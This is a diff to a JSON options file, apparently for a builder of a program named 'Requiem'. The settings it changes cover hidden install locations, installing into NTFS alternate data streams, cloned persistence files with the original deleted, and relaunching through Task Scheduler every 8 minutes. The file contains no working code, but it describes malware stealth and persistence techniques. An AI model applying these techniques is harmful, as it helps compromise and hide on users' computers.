@@ -36,17 +36,17 @@
     "setup": [
         {
             "name": "Use custom directory",
-            "info": "Installs Requiem to a custom directory. If unchecked, Requiem will install to the music folder or program files directory if it has admin privileges.",
+            "info": "Installs Requiem to a custom directory. If unchecked, Requiem will install to %USERPROFILE%\\Music or %PROGRAMFILES% if it has admin privileges.",
             "type": "checkbox"
         },
         {
             "name": "Custom directory path",
-            "info": "The path of the directory. Use \"<USERPROFILE>\" for the user profile directory or \"<USER>\" for the device's username.",
+            "info": "The path of the directory.",
             "type": "text"
         },
         {
             "name": "Randomize directory",
-            "info": "Picks a random directory from the user profile directory or program files directory if it has admin privileges. This has priority over \"Use custom directory\".",
+            "info": "Picks a random directory from %USERPROFILE% or %PROGRAMFILES% if it has admin privileges. This has priority over \"Use custom directory\".",
             "type": "checkbox"
         },
         {
@@ -77,7 +77,7 @@
         },
         {
             "name": "Custom alternate data stream",
-            "info": "The Path of the ADS Requiem will install itself to.",
+            "info": "The Path of the ADS Requiem will install itself to. If this is empty, It will install to %SYSTEMROOT% if it has admin privileges or %USERPROFILE%\\AppData if it does not.",
             "type": "text"
         },
         {
@@ -142,7 +142,15 @@
             "type": "text"
         },
         {
-            "name": "Task Schedular",
+            "name": "Randomize persistence file location",
+            "info": "Clones Requiem's file for ever persistence method instead of pointing back to a single file. The originial file will be deleted after initialization.",
+            "type": "checkbox"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Task schedular",
             "info": "Uses the Task Schedular, It will start Requiem continuosly after that every 8 minutes.",
             "type": "checkbox"
         },
